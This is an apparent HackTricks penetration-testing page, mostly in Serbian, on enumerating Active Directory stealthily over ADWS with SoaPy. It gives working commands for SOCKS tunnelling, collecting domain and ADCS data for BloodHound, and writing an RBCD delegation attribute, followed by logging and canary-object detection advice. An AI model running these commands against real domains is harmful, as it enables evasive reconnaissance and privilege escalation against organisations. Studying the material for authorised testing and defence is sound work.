# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Šta je ADWS?

Active Directory Web Services (ADWS) je **omogućen po defaultu na svakom Domain Controller-u od Windows Server 2008 R2** i sluša na TCP **9389**.  I pored imena, **nema HTTP-a**.  Umesto toga, usluga izlaže LDAP-stil podatke kroz skup proprietarnih .NET protokola:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Pošto je saobraćaj enkapsuliran unutar ovih binarnih SOAP okvira i putuje preko neobičnog porta, **enumeracija kroz ADWS je daleko manje verovatna da će biti inspekcija, filtrirana ili potpisana nego klasični LDAP/389 & 636 saobraćaj**.  Za operatore to znači:

* Diskretnija recon – Plave ekipe često se fokusiraju na LDAP upite.
* Sloboda prikupljanja sa **ne-Windows hostova (Linux, macOS)** tunelovanjem 9389/TCP kroz SOCKS proxy.
* Isti podaci koje biste dobili putem LDAP-a (korisnici, grupe, ACL-ovi, šema, itd.) i mogućnost izvođenja **upisa** (npr. `msDs-AllowedToActOnBehalfOfOtherIdentity` za **RBCD**).

> NAPOMENA: ADWS se takođe koristi od strane mnogih RSAT GUI/PowerShell alata, tako da saobraćaj može da se meša sa legitimnom administrativnom aktivnošću.

## SoaPy – Nativni Python Klijent

[SoaPy](https://github.com/logangoins/soapy) je **potpuna re-implementacija ADWS protokolskog steka u čistom Python-u**.  Kreira NBFX/NBFSE/NNS/NMF okvire bajt po bajt, omogućavajući prikupljanje sa Unix-sličnih sistema bez dodirivanja .NET runtime-a.

### Ključne Karakteristike

* Podržava **proxy kroz SOCKS** (korisno iz C2 implantata).
* Fino podešeni pretraživački filteri identični LDAP `-q '(objectClass=user)'`.
* Opcione **write** operacije ( `--set` / `--delete` ).
* **BOFHound izlazni režim** za direktnu ingestiju u BloodHound.
* `--parse` zastavica za formatiranje vremenskih oznaka / `userAccountControl` kada je potrebna ljudska čitljivost.

### Instalacija (operaterski host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Stealth AD Collection Workflow

The following workflow shows how to enumerate **domain & ADCS objects** over ADWS, convert them to BloodHound JSON and hunt for certificate-based attack paths – all from Linux:

1. **Tunnel 9389/TCP** from the target network to your box (e.g. via Chisel, Meterpreter, SSH dynamic port-forward, etc.).  Export `export HTTPS_PROXY=socks5://127.0.0.1:1080` or use SoaPy’s `--proxyHost/--proxyPort`.

2. **Sakupite objekat glavne domene:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Prikupite ADCS povezane objekte iz Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Konvertuj u BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Otpremite ZIP** u BloodHound GUI i pokrenite cypher upite kao što su `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` da otkrijete puteve eskalacije sertifikata (ESC1, ESC8, itd.).

### Pisanje `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Kombinujte ovo sa `s4u2proxy`/`Rubeus /getticket` za kompletnu **Delegaciju zasnovanu na resursima**.

## Detekcija i Ojačavanje

### Detaljno ADDS Logovanje

Omogućite sledeće registry ključeve na Kontrolerima domena kako biste prikazali skupe / neefikasne pretrage koje dolaze iz ADWS (i LDAP):
```powershell
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics' -Name '15 Field Engineering' -Value 5 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Expensive Search Results Threshold' -Value 1 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Search Time Threshold (msecs)' -Value 0 -Type DWORD
```
Događaji će se pojaviti pod **Directory-Service** sa punim LDAP filtrima, čak i kada je upit stigao putem ADWS.

### SACL Canary Objects

1. Kreirajte lažni objekat (npr. onemogućeni korisnik `CanaryUser`).
2. Dodajte **Audit** ACE za _Everyone_ princip, koji se prati na **ReadProperty**.
3. Kada napadač izvrši `(servicePrincipalName=*)`, `(objectClass=user)` itd., DC emituje **Event 4662** koji sadrži pravi SID korisnika – čak i kada je zahtev posredovan ili potiče iz ADWS.

Primer unapred definisane pravila za Elastic:
```kql
(event.code:4662 and not user.id:"S-1-5-18") and winlog.event_data.AccessMask:"0x10"
```
## Rezime alata

| Svrha | Alat | Napomene |
|-------|------|----------|
| ADWS enumeracija | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, čitanje/pisanje |
| BloodHound unos | [BOFHound](https://github.com/bohops/BOFHound) | Konvertuje SoaPy/ldapsearch logove |
| Kompromitacija sertifikata | [Certipy](https://github.com/ly4k/Certipy) | Može se proksirati kroz isti SOCKS |

## Reference

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)

{{#include ../../banners/hacktricks-training.md}}
